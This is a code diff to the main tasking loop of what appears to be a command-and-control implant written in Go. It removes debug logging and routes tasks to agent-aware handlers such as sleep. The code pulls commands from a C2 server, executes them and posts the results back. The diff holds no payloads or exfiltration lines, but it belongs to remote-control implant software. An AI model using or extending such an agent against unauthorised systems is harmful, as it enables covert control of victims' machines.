@@ -139,22 +139,17 @@ func main() {
 
 func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	log.Printf("[DEBUG] MainLoop parameters: maxRetries=%d, sleepInterval=%d, debug=%v", maxRetriesInt, sleepIntervalInt, debugBool)
 
 	// Main execution loop
 	retryCount := 0
 	for {
-		if debugBool {
-			log.Printf("[DEBUG] Starting main loop iteration, retryCount=%d", retryCount)
-		}
 		select {
 		case <-ctx.Done():
 			log.Printf("[INFO] Context cancelled, exiting main loop")
 			return
 		default:
-			log.Printf("[DEBUG] Main loop iteration starting (retry count: %d)", retryCount)
 			if debugBool {
-				log.Printf("[DEBUG] Calling GetTasking...")
+				log.Printf("[DEBUG] Main loop iteration (retry count: %d)", retryCount)
 			}
 			// Get tasks from C2 server
 			tasks, err := c2.GetTasking(agent)
@@ -189,7 +184,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 
 			// Process tasks
 			for _, task := range tasks {
-				response := processTask(task)
+				response := processTaskWithAgent(task, agent)
 				if err := c2.PostResponse(response, agent); err != nil {
 					log.Printf("[ERROR] Failed to post response: %v", err)
 				}
@@ -205,7 +200,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 	}
 }
 
-func processTask(task structs.Task) structs.Response {
+func processTaskWithAgent(task structs.Task, agent *structs.Agent) structs.Response {
 	log.Printf("[INFO] Processing task: %s (ID: %s)", task.Command, task.ID)
 
 	response := structs.Response{
@@ -221,11 +216,19 @@ func processTask(task structs.Task) structs.Response {
 		return response
 	}
 
-	// Execute command
-	result := handler.Execute(task)
-	response.UserOutput = result.Output
-	response.Status = result.Status
-	response.Completed = result.Completed
+	// Check if command supports agent access (for sleep command)
+	if agentHandler, ok := handler.(structs.AgentCommand); ok {
+		result := agentHandler.ExecuteWithAgent(task, agent)
+		response.UserOutput = result.Output
+		response.Status = result.Status
+		response.Completed = result.Completed
+	} else {
+		// Execute regular command
+		result := handler.Execute(task)
+		response.UserOutput = result.Output
+		response.Status = result.Status
+		response.Completed = result.Completed
+	}
 
 	return response
 }
